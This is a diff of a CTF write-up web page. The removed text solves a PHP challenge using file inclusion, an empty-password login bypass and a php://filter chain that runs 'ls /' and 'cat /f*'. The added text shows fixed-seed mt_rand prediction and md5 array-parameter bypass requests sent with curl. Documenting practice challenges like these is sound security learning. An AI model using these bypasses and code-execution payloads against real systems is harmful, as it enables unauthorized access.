@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/myblog/">
+        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/others/%5BSWPUCTF%202024%20%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%88%91%E6%B2%A1%E6%B4%BB%E5%84%BF%E6%95%B4%E8%BE%A3%21/">
       
       
       
@@ -16,16 +16,16 @@
         
       
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>NSSCTF Web - myblog - My Docs</title>
+        <title>[SWPUCTF 2024 秋季新生赛]我没活儿整辣! - My Docs</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
       
 
@@ -44,7 +44,7 @@
       
     
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#nssctf-web-myblog" class="md-skip">
+        <a href="#swpuctf-2024" class="md-skip">
           Skip to content
         </a>
       
@@ -78,7 +78,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              NSSCTF Web - myblog
+              [SWPUCTF 2024 秋季新生赛]我没活儿整辣!
             
           </span>
         </div>
@@ -176,7 +176,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -194,7 +194,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -241,6 +241,117 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        入口与现象
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="分析过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mt_rand" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一关：固定种子的 mt_rand()
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5array" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第二关：md5(array) 绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        利用过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="利用过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一步：通过第一关
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第二步：构造第二关参数
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        关键 payload / 命令
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#flag" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -252,109 +363,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       
-        题型判断
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#page" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第一步：确认 page 是文件包含
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第二步：读关键源码
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第三步：发现空密码登录绕过
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第四步：尝试上传链，发现不是最优解
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#phptemp-phpfilter-lfi2rce" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第五步：转向 php://temp + php://filter 做 LFI2RCE
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第六步：列出根目录，定位 flag 文件
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        第七步：读取 flag
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        利用链总结
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        这题的核心知识点
+        总结
       
     </span>
   </a>
@@ -378,152 +390,102 @@
 
 
 
-<h1 id="nssctf-web-myblog">NSSCTF Web - myblog</h1>
+<h1 id="swpuctf-2024">[SWPUCTF 2024 秋季新生赛]我没活儿整辣!</h1>
+<h2 id="_1">题目信息</h2>
+<ul>
+<li>类型：Web</li>
+<li>题目状态：阶段性分析</li>
+<li>目标：http://node6.anna.nssctf.cn:20903/</li>
+<li>核心漏洞：第一关为固定种子的 <code>mt_rand()</code> 弱口令，第二关为 <code>md5()</code> 对数组参数的类型处理导致的比较绕过</li>
+</ul>
+<h2 id="_2">入口与现象</h2>
+<p>首页只有一个输入框，源码注释里直接给了关键逻辑：</p>
+<pre><code class="language-php">mt_srand(114514);
+$result = intval(mt_rand());
+</code></pre>
+<p>站点响应头还能看到后端环境是 <code>PHP/7.3.33</code>，所以这里不能随便用别的版本猜值，必须按实际 PHP 行为算首个 <code>mt_rand()</code> 输出。</p>
+<p>提交正确密码后，页面提示进入下一关：</p>
+<pre><code class="language-text">密码正确！下一关：/leve2.php
+</code></pre>
+<p>访问 <a href="http://node6.anna.nssctf.cn:20903/leve2.php"><code>/leve2.php</code></a> 会直接高亮源码：</p>
+<pre><code class="language-php">&lt;?php 
+ highlight_file(__FILE__);
+if (isset($_GET['a']) &amp;&amp; isset($_GET['b'])&amp;&amp;isset($_POST['c'])&amp;&amp;isset($_POST['d'])){
+    $a = $_GET['a'];
+    $b = $_GET['b'];
+    $c = $_POST['c'];
+    $d = $_POST['d'];
+    if (($a != $b &amp;&amp; md5($a) == md5($b)) &amp;&amp; ($c != $d &amp;&amp; md5($c) === md5($d))) {
+        echo $FLAG;
+    }else {
+        echo &quot;实在没活儿了还是咬打火机吧&quot;; 
+        echo '&lt;img src=&quot;./eat firemachine.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;'; }
+}else {
+    echo &quot;不传参我让你飞起来！！！&quot;;
+    echo '&lt;img src=&quot;./fly.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;'; 
+}?&gt;
+</code></pre>
+<h2 id="_3">分析过程</h2>
+<h3 id="mt_rand">第一关：固定种子的 <code>mt_rand()</code></h3>
+<p>最开始我用自己写的 MT19937 脚本复现，结果和目标站不一致。后面直接用本地 PHP CLI 跳过损坏的 <code>php.ini</code> 配置，以 <code>php -n</code> 执行最小脚本，得到真实输出：</p>
+<pre><code class="language-php">&lt;?php
+mt_srand(114514);
+echo mt_rand(), PHP_EOL;
+</code></pre>
+<p>输出为：</p>
+<pre><code class="language-text">1476944489
+</code></pre>
+<p>把这个值提交到首页后，服务器返回：</p>
+<pre><code class="language-text">密码正确！下一关：/leve2.php
+</code></pre>
+<p>所以第一关本质就是源码泄露后的固定随机数复现。</p>
+<h3 id="md5array">第二关：<code>md5(array)</code> 绕过</h3>
+<p>第二关分成两组条件：</p>
+<pre><code class="language-php">($a != $b &amp;&amp; md5($a) == md5($b))
+($c != $d &amp;&amp; md5($c) === md5($d))
+</code></pre>
+<p>第一组是弱比较，常规思路可以用 <code>0e...</code> 魔术哈希；但第二组用了 <code>===</code>，普通魔术哈希就不够了。</p>
+<p>这里更直接的做法是给 <code>md5()</code> 传数组。在 <code>PHP 7.3.33</code> 下，<code>md5(array)</code> 会报 <code>Warning</code>，同时返回 <code>NULL</code>。于是：</p>
+<ul>
+<li>只要 <code>a</code> 和 <code>b</code> 是不同数组，<code>$a != $b</code> 成立；</li>
+<li><code>md5($a)</code> 和 <code>md5($b)</code> 都是 <code>NULL</code>，弱比较 <code>==</code> 成立；</li>
+<li><code>c</code> 和 <code>d</code> 同样传不同数组时，<code>$c != $d</code> 成立；</li>
+<li><code>md5($c)</code> 和 <code>md5($d)</code> 也都是 <code>NULL</code>，严格比较 <code>===</code> 依然成立。</li>
+</ul>
+<p>因此可以用数组一次性满足两组判断。</p>
+<h2 id="_4">利用过程</h2>
+<h3 id="_5">第一步：通过第一关</h3>
+<p>直接提交第一关密码：</p>
+<pre><code class="language-bash">curl.exe -i -X POST -d &quot;captcha=1476944489&quot; &quot;http://node6.anna.nssctf.cn:20903/&quot;
+</code></pre>
+<p>返回关键提示：</p>
+<pre><code class="language-text">密码正确！下一关：/leve2.php
+</code></pre>
+<h3 id="_6">第二步：构造第二关参数</h3>
+<p>对第二关发送如下请求：</p>
+<pre><code class="language-bash">curl.exe -i -X POST -d &quot;c[]=1&amp;d[]=2&quot; &quot;http://node6.anna.nssctf.cn:20903/leve2.php?a[]=1&amp;b[]=2&quot;
+</code></pre>
+<p>这时服务端会连续报出 4 个 <code>md5()</code> warning：</p>
+<pre><code class="language-text">Warning: md5() expects parameter 1 to be string, array given in /var/www/html/leve2.php on line 8
+</code></pre>
+<p>但页面没有进入 <code>else</code> 分支，没有出现“实在没活儿了还是咬打火机吧”，说明条件判断实际上已经被满足了。</p>
+<h2 id="payload">关键 payload / 命令</h2>
+<pre><code class="language-text">第一关密码：1476944489
+
+第二关：
+GET  /leve2.php?a[]=1&amp;b[]=2
+POST c[]=1&amp;d[]=2
+</code></pre>
+<pre><code class="language-bash">curl.exe -i -X POST -d &quot;captcha=1476944489&quot; &quot;http://node6.anna.nssctf.cn:20903/&quot;
+curl.exe -i -X POST -d &quot;c[]=1&amp;d[]=2&quot; &quot;http://node6.anna.nssctf.cn:20903/leve2.php?a[]=1&amp;b[]=2&quot;
+</code></pre>
 <h2 id="flag">Flag</h2>
-<p><code>NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}</code></p>
-<h2 id="_1">题型判断</h2>
-<p>这题本质是 <code>page</code> 参数导致的 PHP 文件包含，核心利用点是 PHP 伪协议。</p>
-<p>从题目提示可以先想到两件事：</p>
-<ol>
-<li><code>Do you know the PHP pseudo-protocol?</code></li>
-<li><code>If you have something to empty...</code></li>
-<li><code>Learn more about PHP pseudo-protocol.</code></li>
-</ol>
-<p>第 1、3 条基本明示先看 <code>php://filter</code>。</p>
-<p>第 2 条的 <code>empty</code> 则是后面登录绕过的关键。</p>
-<h2 id="page">第一步：确认 <code>page</code> 是文件包含</h2>
-<p>访问首页：</p>
-<pre><code class="language-text">http://node4.anna.nssctf.cn:23764/index.php?page=home
+<pre><code class="language-text">当前靶场环境中，第二关条件命中后没有输出任何 flag 内容。
+从返回结果看，利用链已经成立，但 `$FLAG` 在当前实例里没有被正确回显，疑似题目环境变量或预包含配置缺失。
 </code></pre>
-<p>再测试：</p>
-<pre><code class="language-text">http://node4.anna.nssctf.cn:23764/index.php?page=php://filter/read=convert.base64-encode/resource=login
-</code></pre>
-<p>页面直接回显了 <code>login.php</code> 的 base64 源码，说明这里是典型的包含点，而且 <code>php://filter</code> 可用。</p>
-<h2 id="_2">第二步：读关键源码</h2>
-<p>读到的关键源码有两处。</p>
-<p><code>login.php</code> 末尾：</p>
-<pre><code class="language-php">&lt;?php
-require_once(&quot;secret.php&quot;);
-mt_srand($secret_seed);
-$_SESSION['password'] = mt_rand();
-?&gt;
-</code></pre>
-<p><code>secret.php</code>：</p>
-<pre><code class="language-php">&lt;?php
-$secret_seed = mt_rand();
-?&gt;
-</code></pre>
-<p><code>admin/user.php</code> 前面的登录逻辑：</p>
-<pre><code class="language-php">&lt;?php
-error_reporting(0);
-session_start();
-$logined = false;
-if (isset($_POST['username']) and isset($_POST['password'])){
-    if ($_POST['username'] === &quot;Longlone&quot; and $_POST['password'] == $_SESSION['password']){
-        $logined = true;
-        $_SESSION['status'] = $logined;
-    }
-}
-if ($logined === false &amp;&amp; !isset($_SESSION['status']) || $_SESSION['status'] !== true){
-    echo &quot;&lt;script&gt;alert('username or password not correct!');window.location.href='index.php?page=login';&lt;/script&gt;&quot;;
-    die();
-}
-?&gt;
-</code></pre>
-<h2 id="_3">第三步：发现空密码登录绕过</h2>
-<p>题目第二个提示说：</p>
-<pre><code class="language-text">If you have something to empty...
-</code></pre>
-<p>这里的关键在于：</p>
-<pre><code class="language-php">$_POST['password'] == $_SESSION['password']
-</code></pre>
-<p>这是弱比较。</p>
-<p>如果直接向 <code>admin/user</code> 发起登录请求，而不是先访问 <code>login.php</code>，那么当前 session 里根本没有初始化 <code>$_SESSION['password']</code>，它相当于 <code>NULL</code>。</p>
-<p>这时如果提交空密码：</p>
-<pre><code class="language-text">username=Longlone&amp;password=
-</code></pre>
-<p>则会触发：</p>
-<pre><code class="language-php">&quot;&quot; == NULL
-</code></pre>
-<p>弱比较结果为真，于是可以直接登录后台。</p>
-<p>验证请求：</p>
-<pre><code class="language-bash">curl -i -c cookie.txt -b cookie.txt -d &quot;username=Longlone&amp;password=&quot; &quot;http://node4.anna.nssctf.cn:23764/?page=admin/user&quot;
-</code></pre>
-<p>返回的是后台页面而不是报错，说明绕过成功。</p>
-<h2 id="_4">第四步：尝试上传链，发现不是最优解</h2>
-<p>后台里确实有文件上传点：</p>
-<pre><code class="language-php">if(isset($_FILES['Files']) and $_SESSION['status'] === true){
-    ...
-    move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);
-}
-</code></pre>
-<p>我先测试过上传归档伪装图片，再尝试 <code>zip://</code> 包装器包含，但这条链没有顺利打通，像是目录或路径解析并不稳定。</p>
-<p>不过这一步不是必须的，因为题目真正的解法仍然围绕 PHP 伪协议。</p>
-<h2 id="phptemp-phpfilter-lfi2rce">第五步：转向 <code>php://temp</code> + <code>php://filter</code> 做 LFI2RCE</h2>
-<p>由于包含点会自动在参数后拼接 <code>.php</code>，普通 <code>data://</code>、上传文件包含都不够稳定。</p>
-<p>这时就要利用更经典的思路：</p>
-<pre><code class="language-text">php://filter/.../resource=php://temp
-</code></pre>
-<p><code>php://temp</code> 是“空流”，正好对应题目里的 <code>empty</code> 提示。</p>
-<p>再配合 filter chain，可以从空流里“构造”出任意 PHP 代码，最终达到代码执行。</p>
-<p>我本地使用 <code>php_filter_chain_generator.py</code> 生成 payload。</p>
-<p>先用最小代码验证是否执行成功：</p>
-<pre><code class="language-php">&lt;?=1;?&gt;
-</code></pre>
-<p>请求后页面回显了 <code>1</code>，说明 filter chain 执行链成立。</p>
-<h2 id="flag_1">第六步：列出根目录，定位 flag 文件</h2>
-<p>接着生成如下代码的 filter chain：</p>
-<pre><code class="language-php">&lt;?php system(&quot;ls /&quot;);die();?&gt;
-</code></pre>
-<p>请求后得到根目录列表：</p>
-<pre><code class="language-text">bin
-boot
-dev
-etc
-flllaggggggggg_isssssssssss_heeeeeeeeeere
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-run.sh
-sbin
-srv
-sys
-tmp
-usr
-var
-</code></pre>
-<p>可以看到 flag 文件名是：</p>
-<pre><code class="language-text">/flllaggggggggg_isssssssssss_heeeeeeeeeere
-</code></pre>
-<h2 id="flag_2">第七步：读取 flag</h2>
-<p>为了缩短 payload，直接不用完整文件名，而是用通配：</p>
-<pre><code class="language-php">&lt;?php system(&quot;cat /f*&quot;);die();?&gt;
-</code></pre>
-<p>最终拿到：</p>
-<pre><code class="language-text">NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}
-</code></pre>
-<h2 id="_5">利用链总结</h2>
-<ol>
-<li><code>page</code> 参数存在文件包含。</li>
-<li>用 <code>php://filter</code> 读取 <code>login.php</code>、<code>admin/user.php</code>、<code>secret.php</code> 源码。</li>
-<li>通过 <code>admin/user.php</code> 里的弱比较发现空密码绕过：<code>"" == NULL</code>。</li>
-<li>登录后台后继续分析，确认上传链不是最稳妥的主解。</li>
-<li>根据题目提示转向 <code>php://temp</code>。</li>
-<li>使用 <code>php://filter</code> filter chain 从空流构造 PHP 代码，实现 LFI2RCE。</li>
-<li><code>ls /</code> 找到异常命名的 flag 文件。</li>
-<li><code>cat /f*</code> 读取 flag。</li>
-</ol>
-<h2 id="_6">这题的核心知识点</h2>
-<p><code>php://filter</code></p>
-<p><code>php://temp</code></p>
-<p>PHP 弱比较</p>
-<p>LFI 到 RCE 的 filter chain 利用</p>
+<h2 id="_7">总结</h2>
+<p>这题前半段非常直接：首页注释已经把 <code>mt_srand(114514)</code> 和 <code>mt_rand()</code> 暴露了出来，关键只是注意按真实 PHP 行为复现出首个随机数 <code>1476944489</code>。第二关则是典型的类型处理题，利用 <code>PHP 7.3</code> 中 <code>md5(array)</code> 返回 <code>NULL</code> 的特性，就能同时绕过弱比较和严格比较。</p>
+<p>可惜当前在线实例在第二关条件命中后没有实际输出 flag，所以这篇先按阶段性分析记录；如果后续靶场恢复正常，只需要复用同一组参数即可完成取 flag。</p>
 
 
 
@@ -573,10 +535,10 @@ var
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
